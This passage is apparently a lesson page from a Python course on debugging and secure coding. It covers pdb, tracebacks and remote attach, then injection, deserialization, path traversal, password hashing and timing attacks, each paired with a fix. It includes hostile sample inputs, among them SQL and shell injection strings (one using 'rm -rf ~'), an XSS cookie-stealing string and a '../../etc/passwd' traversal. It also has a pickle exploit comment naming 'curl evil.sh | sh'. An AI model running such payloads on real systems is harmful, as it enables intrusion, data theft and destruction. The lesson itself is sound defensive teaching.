@@ -1,0 +1,1252 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>M43 · Debugging &amp; Secure Code · Python Practicum</title>
+<link rel="stylesheet" href="../assets/css/course.css">
+<script src="../assets/js/curriculum.js"></script>
+<script src="../assets/js/viz.js" defer></script>
+<script src="../assets/js/viz-ds.js" defer></script>
+<script src="../assets/js/viz-algo.js" defer></script>
+<script src="../assets/js/viz-data.js" defer></script>
+<script src="../assets/js/course.js" defer></script>
+</head>
+<body data-root="../" data-module="m43">
+<main class="lesson">
+  <header class="lesson-hero">
+    <p class="eyebrow">Part 6 · Professional Python · Module 43</p>
+    <h1>Debugging &amp; Secure Code</h1>
+    <p class="lede">Two professional skills that beginners rarely get taught. One is finding bugs methodically
+      instead of guessing. The other is not writing the bugs attackers look for. This module covers pdb, including
+      Python 3.14's live attach, then works through the vulnerabilities that show up most in real Python code and
+      has you fix each one.</p>
+    <div class="lesson-meta"><span>⏱ ~2.5 hours</span><span>Prerequisites: <a href="m07-exceptions.html">M07 Exceptions</a>, <a href="m17-testing.html">M17 Testing</a>, <a href="m40-stdlib.html">M40 Standard Library</a>, <a href="m42-tooling.html">M42 Tooling</a></span></div>
+    <ul class="objectives">
+      <li>Debug systematically: reproduce, isolate, hypothesise, verify</li>
+      <li>Read chained tracebacks and attach context with <code>add_note()</code></li>
+      <li>Drive pdb fluently, including post-mortem and 3.14 remote attach (<code>python -m pdb -p PID</code>)</li>
+      <li>Use faulthandler, logging, pytest's debugging flags, and IDE debuggers</li>
+      <li>Prevent injection (SQL, shell), unsafe deserialization, and path traversal, and template safely with t-strings</li>
+      <li>Handle secrets, password hashing, tokens, and constant-time comparison correctly</li>
+      <li>Audit dependencies and map the OWASP Top 10 onto Python code</li>
+    </ul>
+  </header>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="mindset">
+    <h2>A debugging mindset</h2>
+    <p>A <strong>bug</strong> is a gap between what you believe the code does and what it actually does. Debugging
+      means finding where your belief is wrong. Changing things at random until the symptom goes away leaves the
+      wrong belief in place. The reliable method is the scientific one:</p>
+    <ol>
+      <li><strong>Reproduce.</strong> Get a reliable way to trigger the bug, ideally as a failing test. If you can't
+        reproduce it, you can't confirm you've fixed it.</li>
+      <li><strong>Isolate.</strong> Shrink the input and the code path until the bug is small enough to fit in your
+        head. Halving works well here: halve the input, or <code>git bisect</code> halves the history.</li>
+      <li><strong>Hypothesise.</strong> State a specific, falsifiable guess: "the sensor sends the string
+        <code>"n/a"</code> for a failed reading, and <code>sum()</code> can't add it".</li>
+      <li><strong>Verify.</strong> Test the guess with a debugger, an assertion, or a log line. Then fix the cause,
+        keep the failing test (now passing) as a regression test, and check you haven't broken anything else.</li>
+    </ol>
+    <p>Isolation can be automated. This cell shrinks a failing input by repeatedly removing halves that still
+      trigger the bug, a simplified form of <em>delta debugging</em>:</p>
+    <div class="runnable" data-title="Shrink a failing input automatically">
+<textarea>
+def buggy_average(readings):
+    cleaned = [r for r in readings if r is not None]
+    return sum(cleaned) / len(cleaned)
+
+def fails(data):
+    try:
+        buggy_average(data)
+        return False
+    except TypeError:
+        return True
+
+data = [21.5, None, 22.0, 21.8, None, 22.4, 23.1, 22.9] * 4
+data[19] = "n/a"          # one sensor glitch hidden in the day's 32 readings
+print("original length:", len(data), "fails:", fails(data))
+
+changed = True
+while changed and len(data) > 1:
+    changed = False
+    half = len(data) // 2
+    for candidate in (data[:half], data[half:]):
+        if fails(candidate):
+            data, changed = candidate, True
+            break
+print("minimal failing input:", data)
+</textarea>
+    </div>
+    <p>The minimal input, <code>['n/a']</code>, confirms the hypothesis. Now step through a fixed version and
+      watch which readings reach <code>cleaned</code>, including the edge case where none do:</p>
+    <div class="tracer" data-title="Step through the fixed version">
+<textarea>
+def average(readings):
+    cleaned = []
+    for r in readings:
+        if isinstance(r, (int, float)):
+            cleaned.append(r)
+    if not cleaned:
+        return None
+    return sum(cleaned) / len(cleaned)
+
+result = average([21.5, "n/a", 22.5])
+empty = average(["n/a"])
+</textarea>
+    </div>
+    <aside class="callout think"><p>The fix silently skips <code>"n/a"</code> and returns <code>None</code> for "no
+      data". Is that the right contract, or should a glitch raise <code>ValueError</code> so somebody notices the
+      broken sensor? A fix is also a design decision. Write it down in a test so the next person doesn't have to
+      guess.</p></aside>
+    <p><strong>Remember:</strong> reproduce, isolate, hypothesise, verify. Then keep the reproduction as a
+      regression test.</p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="tracebacks">
+    <h2>Reading tracebacks deeply</h2>
+    <p>A <strong>traceback</strong> is the call stack at the moment an exception was raised. Read it from the
+      <strong>bottom up</strong>. The last line is the exception type and message. Above it is the frame that
+      raised it, then the frame that called that one, and so on up to the entry point. The
+      <code>~~~^^^</code> markers underline the exact sub-expression that failed.</p>
+    <p>When one exception leads to another, Python shows both, joined by one of two sentences:</p>
+    <ul>
+      <li><strong>"The above exception was the direct cause of the following exception"</strong>: someone wrote
+        <code>raise New(...) from original</code>. The original is stored in <code>__cause__</code>. This is
+        deliberate translation, for example from a low-level <code>ValueError</code> to a domain
+        <code>ConfigError</code>.</li>
+      <li><strong>"During handling of the above exception, another exception occurred"</strong>: a new exception
+        happened inside an <code>except</code> block. The original is in <code>__context__</code>. This usually
+        means the error handling itself has a bug.</li>
+    </ul>
+    <p><code>raise New(...) from None</code> hides the context when it would only be noise. Since Python 3.11,
+      <code>exc.add_note("...")</code> attaches extra lines of context to an exception as it passes through each
+      layer, without changing its type:</p>
+    <div class="runnable" data-title="Chains and notes">
+<textarea>
+import traceback
+
+class ConfigError(Exception):
+    pass
+
+def parse_port(text):
+    try:
+        return int(text)
+    except ValueError as exc:
+        raise ConfigError(f"port must be an integer, got {text!r}") from exc
+
+def start_service(name, settings):
+    try:
+        return parse_port(settings["port"])
+    except ConfigError as exc:
+        exc.add_note(f"while starting service {name!r}")
+        exc.add_note("hint: check settings.toml")
+        raise
+
+try:
+    start_service("billing", {"port": "eighty"})
+except ConfigError as exc:
+    print(traceback.format_exc())
+    print("cause:", repr(exc.__cause__))
+    print("notes:", exc.__notes__)
+</textarea>
+    </div>
+    <div class="runnable" data-title="Predict: cause or context?" data-predict>
+<textarea>
+try:
+    try:
+        {}["missing"]
+    except KeyError:
+        int("x")              # a bug inside the handler
+except ValueError as exc:
+    print(type(exc.__context__).__name__, exc.__cause__)
+</textarea>
+    </div>
+    <aside class="callout py314"><p>Python 3.14 colours tracebacks in the terminal (and the REPL highlights syntax),
+      which makes long chains much easier to scan. Set <code>PYTHON_COLORS=0</code> or <code>NO_COLOR=1</code> to
+      turn colour off, for example when writing to a log file. 3.14 also lets <code>except</code> list several types
+      without parentheses (PEP 758): <code>except TimeoutError, ConnectionError:</code>.</p></aside>
+    <p><strong>Remember:</strong> read tracebacks from the bottom up. "Direct cause" means a deliberate
+      <code>from</code>, and "during handling" means the handler itself failed. Add context with
+      <code>add_note()</code>.</p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="pdb">
+    <h2>pdb: breakpoints, post-mortem, and remote attach</h2>
+    <p><strong>pdb</strong> is Python's built-in interactive debugger. It pauses your program so you can inspect
+      variables, walk up and down the stack, and step one line at a time. You can start it three ways:</p>
+    <pre data-label="Terminal"><code class="language-bash">pixi run python -m pdb app.py        # start under the debugger, stop at the first line
+pixi run python -m pdb -c continue app.py   # run until an exception, then stop there (post-mortem)
+PYTHONBREAKPOINT=0 pixi run python app.py   # disable every breakpoint() call</code></pre>
+    <pre data-label="app.py"><code class="language-python">def mean(values: list[float]) -&gt; float:
+    total = sum(values)
+    breakpoint()          # built-in since 3.7: pauses here and opens pdb
+    return total / len(values)</code></pre>
+    <table>
+      <thead><tr><th>Command</th><th>Meaning</th></tr></thead>
+      <tbody>
+        <tr><td><code>n</code>(ext)</td><td>Run the current line and stop at the next one in this function</td></tr>
+        <tr><td><code>s</code>(tep)</td><td>Step <em>into</em> a call on the current line</td></tr>
+        <tr><td><code>c</code>(ontinue)</td><td>Run until the next breakpoint</td></tr>
+        <tr><td><code>r</code>(eturn)</td><td>Run until the current function returns</td></tr>
+        <tr><td><code>l</code>(ist) / <code>ll</code></td><td>Show source around the current line / the whole function</td></tr>
+        <tr><td><code>p expr</code> / <code>pp expr</code></td><td>Print / pretty-print an expression</td></tr>
+        <tr><td><code>w</code>(here)</td><td>Show the stack (the current frame is marked <code>&gt;</code>)</td></tr>
+        <tr><td><code>u</code>(p) / <code>d</code>(own)</td><td>Move to the caller's frame / back toward the error</td></tr>
+        <tr><td><code>b file:line</code>, <code>b func</code>, <code>b line, cond</code></td><td>Set a (conditional) breakpoint</td></tr>
+        <tr><td><code>cl</code>(ear) <code>[n]</code></td><td>Clear breakpoints</td></tr>
+        <tr><td><code>a</code>(rgs)</td><td>Show the current function's arguments</td></tr>
+        <tr><td><code>interact</code></td><td>Open a full Python REPL in the current frame's namespace</td></tr>
+        <tr><td><code>q</code>(uit)</td><td>Abort the program</td></tr>
+      </tbody>
+    </table>
+    <p><strong>Post-mortem debugging</strong> means opening the debugger <em>after</em> a crash, positioned at the
+      frame that raised. In the REPL, run the failing call and then <code>import pdb; pdb.pm()</code>. In code,
+      use <code>pdb.post_mortem(exc.__traceback__)</code>. The cell below drives a real pdb post-mortem session
+      with scripted commands, typing what you would type:</p>
+    <div class="runnable" data-title="A scripted pdb post-mortem session">
+<textarea>
+import io
+import pdb
+
+def mean(values):
+    total = sum(values)
+    return total / len(values)
+
+def report(data):
+    cleaned = [x for x in data if x is not None]
+    return f"mean={mean(cleaned):.2f}"
+
+try:
+    report([None, None])
+except ZeroDivisionError as exc:
+    tb = exc.__traceback__
+
+# The commands you would type at the (Pdb) prompt:
+typed = ["p values", "p total", "a", "u", "pp data", "p cleaned", "c"]
+out = io.StringIO()
+debugger = pdb.Pdb(stdin=io.StringIO("\n".join(typed) + "\n"), stdout=out)
+debugger.reset()
+debugger.interaction(None, tb)          # what pdb.post_mortem(tb) does
+for line, command in zip(out.getvalue().split("(Pdb) ")[1:], typed):
+    print(f"(Pdb) {command}\n{line.rstrip()}")
+</textarea>
+    </div>
+    <p>The session shows that <code>values</code> is empty in <code>mean</code>, and moving <code>u</code>p to
+      <code>report</code> shows why: every element of <code>data</code> was <code>None</code>. That took two
+      commands, and you didn't have to edit the code or add any print statements.</p>
+
+    <h3>Attaching to a running process (Python 3.14)</h3>
+    <p>Sometimes the bug only appears in a long-running process, such as a stuck worker or a server that slowly
+      leaks memory, and you can't restart it under a debugger. Python 3.14 adds <strong>safe external debugger
+      attach</strong> (PEP 768). The interpreter now has a well-defined point where it can run code injected from
+      outside, and pdb uses it:</p>
+    <pre data-label="Terminal (3.14)"><code class="language-bash">$ pixi run python worker.py &amp;        # a long-running process, PID 48213
+$ pixi run python -m pdb -p 48213    # attach pdb to it, live
+(Pdb) w
+(Pdb) p len(self.queue)
+$ pixi run python -m asyncio ps 48213     # 3.14: list asyncio tasks in a running process
+$ pixi run python -m asyncio pstree 48213 # ...as a tree of awaits</code></pre>
+    <p>The low-level API is <code>sys.remote_exec(pid, script_path)</code>. It asks the target process to run a
+      Python file at its next safe point, which is how profilers and debuggers can attach without unsafe memory
+      hacks:</p>
+    <div class="runnable" data-local="Attaching to another process requires real OS processes and debugging permissions; try it with two terminals on your machine." data-title="sys.remote_exec (3.14)">
+<textarea>
+import sys
+import tempfile
+
+pid = int(input("PID of a running Python 3.14 process: "))
+with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
+    f.write("import sys, traceback\n"
+            "traceback.print_stack(file=sys.stderr)\n")   # runs INSIDE the target process
+sys.remote_exec(pid, f.name)
+print("Injected; the target prints its stack at its next safe point.")
+</textarea>
+    </div>
+    <aside class="callout warn"><p>Attach needs operating-system debug permission (same user, and on Linux ptrace
+      permission, often <code>sudo</code>). Production services can opt out with
+      <code>PYTHON_DISABLE_REMOTE_DEBUG=1</code> or <code>-X disable_remote_debug</code>. Anyone who can attach
+      can run arbitrary code in the process, so treat it like shell access.</p></aside>
+    <p><strong>Remember:</strong> use <code>breakpoint()</code> to pause, <code>n</code>/<code>s</code>/<code>c</code>
+      to move, <code>p</code>/<code>pp</code>/<code>w</code>/<code>u</code>/<code>d</code> to inspect, and
+      <code>pdb.pm()</code> after a crash. In 3.14, <code>python -m pdb -p PID</code> attaches to a live
+      process.</p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="debug-tools">
+    <h2>faulthandler, logging, tests, and IDE debuggers</h2>
+    <h3>faulthandler: tracebacks when Python itself dies</h3>
+    <p>A segmentation fault in a C extension, or a deadlock, kills or freezes the interpreter before any Python
+      traceback can print. <code>faulthandler</code> installs low-level handlers that dump every thread's Python
+      stack even then:</p>
+    <pre data-label="Terminal"><code class="language-bash">pixi run python -X faulthandler app.py      # or PYTHONFAULTHANDLER=1</code></pre>
+    <pre data-label="hang_watchdog.py"><code class="language-python">import faulthandler
+import sys
+
+faulthandler.enable()                                          # crash -&gt; dump stacks to stderr
+faulthandler.dump_traceback_later(30, repeat=True, file=sys.stderr)  # still running after 30s? dump stacks
+run_batch_job()
+faulthandler.cancel_dump_traceback_later()</code></pre>
+    <h3>Logging for debugging</h3>
+    <p>A debugger shows one moment in detail. Logs show the whole history, including runs on servers you can't
+      attach to. With the structlog setup from <a href="m42-tooling.html#structlog">M42</a>, leave useful
+      <code>log.debug("cache_miss", key=key)</code> events in the code and switch the level to debug when you're
+      investigating. Bind identifiers (<code>request_id</code>, <code>job_id</code>) so you can filter a single
+      failing run out of millions of lines.</p>
+    <h3>Debugging tests with pytest</h3>
+    <table>
+      <thead><tr><th>Flag</th><th>Use</th></tr></thead>
+      <tbody>
+        <tr><td><code>-x</code></td><td>Stop at the first failure</td></tr>
+        <tr><td><code>-k "parse and not slow"</code></td><td>Run only tests whose names match the expression</td></tr>
+        <tr><td><code>--lf</code> / <code>--ff</code></td><td>Run only the last failures / run them first</td></tr>
+        <tr><td><code>--pdb</code></td><td>Open pdb post-mortem at the failing assertion</td></tr>
+        <tr><td><code>--trace</code></td><td>Open pdb at the start of each selected test</td></tr>
+        <tr><td><code>-l</code> (<code>--showlocals</code>)</td><td>Print local variables in failure tracebacks</td></tr>
+        <tr><td><code>-s</code></td><td>Don't capture output (see prints and logs live)</td></tr>
+        <tr><td><code>-vv</code></td><td>Full assertion diffs</td></tr>
+      </tbody>
+    </table>
+    <pre data-label="Terminal"><code class="language-bash">pixi run pytest tests/unit -x --lf --pdb       # re-run what failed, stop at the first, debug it
+pixi run test -k "test_parse_port" -l          # extra args are appended to the task's command</code></pre>
+    <h3>IDE debuggers</h3>
+    <p>VS Code (with the Python extension, which uses <em>debugpy</em>) and PyCharm give pdb's features a GUI:
+      click in the gutter to set breakpoints, hover to inspect, and watch expressions. Point the IDE at the Pixi
+      interpreter, <code>.pixi/envs/default/bin/python</code> (on Windows,
+      <code>.pixi\envs\default\python.exe</code>), so it sees the same packages your tasks do.</p>
+    <pre data-label=".vscode/launch.json"><code class="language-json">{
+  "version": "0.2.0",
+  "configurations": [
+    {"name": "Debug tests", "type": "debugpy", "request": "launch", "module": "pytest",
+     "args": ["tests/unit", "-x"], "python": "${workspaceFolder}/.pixi/envs/default/bin/python"}
+  ]
+}</code></pre>
+    <aside class="callout tip"><p>A <strong>conditional breakpoint</strong> (<code>b app.py:42, user_id == 7</code> in
+      pdb, or right-click in an IDE) stops only on the one iteration that misbehaves, which beats pressing
+      <code>c</code> 999 times.</p></aside>
+    <p><strong>Remember:</strong> faulthandler covers crashes and hangs, logs give you the history, and
+      <code>pytest -x --lf --pdb</code> is the fastest test-debugging loop. Point your IDE at the Pixi
+      interpreter.</p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="injection">
+    <h2>Input validation and injection</h2>
+    <p>Security starts with one idea: <strong>all input is untrusted</strong>. Input means more than form fields.
+      It includes URLs, headers, file names, uploaded files, environment variables, database rows written by
+      others, and messages from queues. A <strong>trust boundary</strong> is where data crosses from outside your
+      control to inside it, and that's where you validate.</p>
+    <ul>
+      <li><strong>Allow-list, don't block-list.</strong> Define what valid input looks like
+        (<code>re.fullmatch(r"[a-z0-9_]{3,20}", name)</code>) instead of trying to list every bad character.</li>
+      <li><strong>Parse into types.</strong> Turn a string into an <code>int</code>, a <code>date</code>, or an
+        enum member at the boundary, and pass typed values inward.</li>
+      <li><strong>Fail closed.</strong> If you're not sure input is valid, reject it with a clear error.</li>
+    </ul>
+    <h3>SQL injection</h3>
+    <p><strong>Injection</strong> happens when data is mixed into a string that's later interpreted as
+      <em>code</em>: SQL, a shell command, HTML. Then the attacker writes code instead of data. Run this
+      vulnerable login, then the fixed one:</p>
+    <div class="runnable" data-title="SQL injection, live">
+<textarea>
+import sqlite3
+
+conn = sqlite3.connect(":memory:")
+conn.execute("CREATE TABLE users (name TEXT, is_admin INTEGER)")
+conn.executemany("INSERT INTO users VALUES (?, ?)", [("alice", 1), ("bob", 0), ("O'Brien", 0)])
+
+def find_user_vulnerable(name):
+    query = f"SELECT name, is_admin FROM users WHERE name = '{name}'"
+    print("  SQL:", query)
+    return conn.execute(query).fetchall()
+
+def find_user_safe(name):
+    # The ? placeholder sends the value separately: it can never become SQL.
+    return conn.execute("SELECT name, is_admin FROM users WHERE name = ?", (name,)).fetchall()
+
+attack = "nobody' OR '1'='1"
+print("vulnerable:", find_user_vulnerable(attack))
+print("safe:      ", find_user_safe(attack))
+print("safe O'Brien:", find_user_safe("O'Brien"))   # apostrophes just work, too
+</textarea>
+    </div>
+    <p>The fix isn't escaping quotes by hand, and it isn't a regex filter. It's <strong>parameterized
+      queries</strong>: the SQL text and the values travel separately, so the database never parses a value as
+      SQL. Every database driver supports them (<code>?</code> in sqlite3, <code>%s</code> in psycopg). Table and
+      column names can't be parameters. If those come from users, check them against an allow-list.</p>
+
+    <h3>Shell injection</h3>
+    <p>The same bug happens with the operating system shell. <code>subprocess.run(f"wc -l {path}", shell=True)</code>
+      hands the whole string to <code>/bin/sh</code>, so a "file name" like
+      <code>notes.txt; rm -rf ~</code> runs two commands. Pass a <strong>list of arguments</strong> and leave
+      <code>shell</code> at its default (<code>False</code>). The program receives each list element as exactly one
+      argument and no shell parses anything.</p>
+    <div class="runnable" data-local="subprocess needs real OS processes, which the browser sandbox does not have." data-title="subprocess the safe way">
+<textarea>
+import subprocess
+
+path = "notes.txt; echo PWNED"            # hostile input
+
+# NEVER: the shell interprets ; and runs a second command
+# subprocess.run(f"wc -l {path}", shell=True)
+
+# SAFE: one list element = one argument; "--" ends option parsing
+result = subprocess.run(["wc", "-l", "--", path], capture_output=True, text=True, check=False, timeout=10)
+print(result.returncode, result.stderr.strip())   # wc: no such file "notes.txt; echo PWNED". Nothing else ran.
+</textarea>
+    </div>
+    <div class="runnable" data-title="See how a shell would split the input">
+<textarea>
+import shlex
+
+hostile = "notes.txt; echo PWNED"
+print("a shell would see tokens:", shlex.split(f"wc -l {hostile}"))
+print("list args keep it whole: ", ["wc", "-l", "--", hostile])
+print("if you MUST build a shell string, quote:", f"wc -l {shlex.quote(hostile)}")
+</textarea>
+    </div>
+    <aside class="callout warn"><p>List arguments stop <em>shell</em> injection but not <em>argument</em> injection.
+      A file name like <code>--output=/etc/passwd</code> is still read as an option by many programs. Put
+      <code>--</code> before user-supplied paths, or reject names that start with <code>-</code>.</p></aside>
+    <aside class="callout pro"><p>Ruff's <code>S</code> rules (from Bandit) flag these patterns automatically:
+      <code>S608</code> SQL built from strings, <code>S602</code> <code>shell=True</code>, <code>S301</code> pickle,
+      <code>S324</code> weak hashes, <code>S105</code> hard-coded passwords, and <code>S311</code> the
+      <code>random</code> module used for security.</p></aside>
+    <p><strong>Remember:</strong> keep code and data apart. Use <code>?</code> placeholders for SQL and argument
+      lists without <code>shell=True</code> for subprocess, and validate against an allow-list at every trust
+      boundary.</p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="t-strings">
+    <h2>Safe templating with 3.14 t-strings</h2>
+    <p>f-strings are dangerous for building SQL or HTML because they produce a finished <code>str</code>
+      immediately. By the time any function sees the result, the data and the code are already mixed together.
+      Python 3.14's <strong>template strings</strong> (PEP 750) fix this. A <code>t"..."</code> literal produces a
+      <code>string.templatelib.Template</code> that keeps the static text and the interpolated values
+      <em>separate</em>. A processing function then decides how to handle each value safely.</p>
+    <div class="runnable" data-title="t-strings keep data separate from markup">
+<textarea>
+from html import escape
+from string.templatelib import Interpolation, Template
+
+def render_html(template: Template) -> str:
+    parts = []
+    for item in template:                       # yields str and Interpolation objects in order
+        if isinstance(item, Interpolation):
+            parts.append(escape(str(item.value)))   # every value is escaped
+        else:
+            parts.append(item)                  # static text written by the developer
+    return "".join(parts)
+
+name = "<script>steal(document.cookie)</script>"
+tmpl = t"<p>Hello, {name}!</p>"
+print(type(tmpl).__name__)
+print("strings:", tmpl.strings)
+print("expr:   ", tmpl.interpolations[0].expression)
+print(render_html(tmpl))
+</textarea>
+    </div>
+    <p>The same technique turns a t-string into a parameterized SQL query. Exercise 5 has you build it:</p>
+    <div class="runnable" data-title="Predict: what does the template hold?" data-predict>
+<textarea>
+user = "bob"
+limit = 5
+q = t"SELECT * FROM users WHERE name = {user} LIMIT {limit}"
+print(q.strings)
+print(q.values)
+</textarea>
+    </div>
+    <aside class="callout py314"><p>t-strings don't escape anything by themselves. They give your function
+      structured access to the values, and a t-string is <em>not</em> a <code>str</code>, so passing one to a
+      function that expects text fails loudly instead of silently mixing data into code. Libraries for HTML and
+      SQL are adopting <code>Template</code> parameters so the safe path is also the easy one.</p></aside>
+    <p><strong>Remember:</strong> an f-string produces a finished string, while a t-string keeps the template
+      and values separate so a function can escape or parameterize each value.</p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="deserialization-paths">
+    <h2>Unsafe deserialization and path traversal</h2>
+    <h3>pickle and yaml.load run code</h3>
+    <p><code>pickle</code> isn't a data format. It's a small program that the unpickler <em>executes</em>. Through
+      <code>__reduce__</code>, a pickle can tell Python to call any function with any arguments while loading.
+      Unpickling untrusted bytes, such as a cookie, an upload, or a message from a queue, gives the sender code
+      execution:</p>
+    <div class="runnable" data-title="pickle.loads calls functions">
+<textarea>
+import pickle
+
+class Exploit:
+    def __reduce__(self):
+        # A real attacker would return (os.system, ("curl evil.sh | sh",)).
+        return (print, ("!!! this ran inside pickle.loads !!!",))
+
+payload = pickle.dumps(Exploit())
+print("payload bytes:", payload[:40], "...")
+pickle.loads(payload)          # the victim only *loaded* data
+</textarea>
+    </div>
+    <ul>
+      <li>For data from outside, use <strong>JSON</strong> (<code>json.loads</code> only ever builds dicts, lists,
+        strings, numbers, booleans, and <code>None</code>), then <em>validate</em> the structure.</li>
+      <li>PyYAML's <code>yaml.load</code> with an unsafe loader can construct arbitrary Python objects. Always use
+        <code>yaml.safe_load</code>. Ruff flags the unsafe form as <code>S506</code>.</li>
+      <li>Use pickle only for data your own process wrote and nobody else could have modified. If it has to cross a
+        trust boundary, sign it with <code>hmac</code> and check the signature first.</li>
+    </ul>
+    <h3>Path traversal</h3>
+    <p>A download endpoint does <code>open(UPLOADS / filename)</code>. An attacker requests
+      <code>filename = "../../etc/passwd"</code>. Joining paths doesn't confine them: <code>..</code> climbs out,
+      and an absolute path replaces the base entirely. The fix is to <strong>resolve</strong> the final path (which
+      collapses <code>..</code> and follows symlinks) and check it's still inside the base directory:</p>
+    <div class="runnable" data-title="Path traversal and the resolve() check">
+<textarea>
+import tempfile
+from pathlib import Path
+
+root = Path(tempfile.mkdtemp()).resolve()
+base = root / "uploads"
+base.mkdir()
+(base / "report.txt").write_text("quarterly numbers")
+secret = root / "secret.txt"
+secret.write_text("db password")
+
+def read_vulnerable(name):
+    return (base / name).read_text()
+
+def read_safe(name):
+    target = (base / name).resolve()
+    if not target.is_relative_to(base):
+        raise PermissionError(f"{name!r} escapes the upload directory")
+    return target.read_text()
+
+attack = "../secret.txt"
+print("vulnerable:", read_vulnerable(attack))
+print("safe ok:   ", read_safe("report.txt"))
+for bad in (attack, str(secret)):
+    try:
+        read_safe(bad)
+    except PermissionError as exc:
+        print("blocked:   ", exc)
+</textarea>
+    </div>
+    <aside class="callout danger"><p>Don't defend with <code>name.replace("../", "")</code>. Input like
+      <code>"....//"</code> turns back into <code>"../"</code> after the replace. Always use resolve plus
+      <code>is_relative_to</code>, and better still, never let users choose file names at all: store uploads under
+      a generated id such as <code>uuid.uuid7()</code> (new in 3.14).</p></aside>
+    <p><strong>Remember:</strong> never unpickle untrusted bytes, so use JSON with validation and
+      <code>yaml.safe_load</code>. Confine paths with <code>resolve()</code> and
+      <code>is_relative_to()</code>.</p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="secrets">
+    <h2>Secrets, passwords, tokens, and timing attacks</h2>
+    <h3>Secrets management</h3>
+    <p>API keys, database passwords, and signing keys must never appear in source code. Git history keeps them
+      forever, even after you delete the line. Read them from the <strong>environment</strong>, injected by your
+      deployment platform or CI secret store, and fail fast if one is missing:</p>
+    <pre data-label="settings.py"><code class="language-python">import os
+
+DATABASE_URL = os.environ["DATABASE_URL"]      # KeyError at startup beats a confusing failure later
+API_TIMEOUT = float(os.environ.get("API_TIMEOUT", "10"))</code></pre>
+    <ul>
+      <li>For local development, keep values in a <code>.env</code> file that is listed in
+        <code>.gitignore</code> (this repo's <code>.gitignore</code> lists <code>.env</code> and
+        <code>.env.*</code>). Commit a <code>.env.example</code> with placeholder values instead.</li>
+      <li>If a secret is ever committed, <strong>rotate it</strong> (issue a new one and revoke the old one).
+        Rewriting history doesn't help, because it may already have been cloned or scraped.</li>
+      <li>Keep secrets out of logs, tracebacks, and error pages. Some structured traceback renderers capture local
+        variables, so redact them.</li>
+    </ul>
+    <h3>Hashing passwords</h3>
+    <p>Never store passwords, and never store them encrypted either, since anyone with the key can reverse them.
+      Store a <strong>slow, salted hash</strong>. A general-purpose hash like SHA-256 is the wrong tool because it
+      is designed to be <em>fast</em>. A GPU can try billions of guesses per second against a stolen hash. Without
+      a <strong>salt</strong> (random bytes unique to each user), identical passwords produce identical hashes,
+      and precomputed tables crack them instantly.</p>
+    <div class="runnable" data-title="Why fast hashes are bad for passwords">
+<textarea>
+import hashlib
+import os
+import time
+
+start = time.perf_counter()
+n = 50_000
+for i in range(n):
+    hashlib.sha256(f"guess{i}".encode()).digest()
+rate = n / (time.perf_counter() - start)
+print(f"sha256: ~{rate:,.0f} guesses/second here (GPUs do billions)")
+
+salt = os.urandom(16)
+start = time.perf_counter()
+hashlib.pbkdf2_hmac("sha256", b"correct horse", salt, 100_000)
+one = time.perf_counter() - start
+print(f"pbkdf2 (100k iterations): {one * 1000:.0f} ms per guess, ~{1 / one:,.0f} guesses/second")
+
+print("same password, different salts:")
+for _ in range(2):
+    print(" ", hashlib.pbkdf2_hmac("sha256", b"hunter2", os.urandom(16), 1_000).hex()[:32])
+</textarea>
+    </div>
+    <p>The standard library has two good <em>key-derivation functions</em>.
+      <code>hashlib.pbkdf2_hmac("sha256", pw, salt, iterations)</code> is tuned by iteration count, and current
+      OWASP guidance for PBKDF2-HMAC-SHA256 is 600,000. <code>hashlib.scrypt(pw, salt=salt, n=2**14, r=8, p=1)</code>
+      is also memory-hard, which makes GPU attacks more expensive. Store the algorithm, parameters, salt, and hash
+      together, for example as <code>pbkdf2_sha256$600000$&lt;salt hex&gt;$&lt;hash hex&gt;</code>, so you can
+      raise the cost later. Dedicated libraries such as argon2-cffi wrap this pattern for you.</p>
+    <h3>Tokens: the secrets module</h3>
+    <p>Password-reset links, API keys, and session ids must be unpredictable. The <code>random</code> module is a
+      Mersenne Twister. It's fine for simulations, but after an attacker sees enough outputs they can predict the
+      rest. Use <code>secrets</code>, which draws from the operating system's cryptographic random source:</p>
+    <div class="runnable" data-title="secrets for tokens">
+<textarea>
+import secrets
+
+print(secrets.token_urlsafe(32))     # for URLs: reset links, API keys
+print(secrets.token_hex(16))         # hex string
+print(secrets.choice("ABCDEFGHJKLMNPQRSTUVWXYZ23456789"))   # one unbiased pick
+print(secrets.randbelow(1_000_000))  # e.g. a 6-digit code
+</textarea>
+    </div>
+    <h3>Timing attacks and hmac.compare_digest</h3>
+    <p><code>a == b</code> on strings stops at the first differing character. If an attacker can measure response
+      times precisely enough, a guess with more correct leading characters takes slightly longer, so they can
+      recover a secret one character at a time. <code>hmac.compare_digest(a, b)</code> takes the same time
+      however many characters match. The cell counts comparison steps instead of measuring time:</p>
+    <div class="runnable" data-title="Simulate the timing leak">
+<textarea>
+import hmac
+
+SECRET = "k9f2xq"
+
+def naive_equal(a, b):
+    steps = 0
+    if len(a) != len(b):
+        return False, steps
+    for x, y in zip(a, b):
+        steps += 1
+        if x != y:
+            return False, steps      # early exit leaks how much matched
+    return True, steps
+
+for guess in ["aaaaaa", "kaaaaa", "k9aaaa", "k9faaa", "k9f2xq"]:
+    ok, steps = naive_equal(SECRET, guess)
+    print(f"{guess}: equal={ok!s:5} steps={steps}")
+
+print("constant time:", hmac.compare_digest(SECRET.encode(), b"k9faaa"))
+</textarea>
+    </div>
+    <p><strong>Remember:</strong> keep secrets in the environment and never in git, and rotate any that leak.
+      Store passwords as salted pbkdf2 or scrypt hashes. Make tokens with <code>secrets</code> and compare them with
+      <code>hmac.compare_digest</code>.</p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="dependencies-owasp">
+    <h2>Dependency auditing and the OWASP Top 10</h2>
+    <h3>Your dependencies are your code</h3>
+    <p>Most of the code you run, you didn't write. A vulnerability in a dependency is a vulnerability in your app,
+      and a malicious package (a typo-squatted name like <code>reqeusts</code>, or a hijacked maintainer account) is
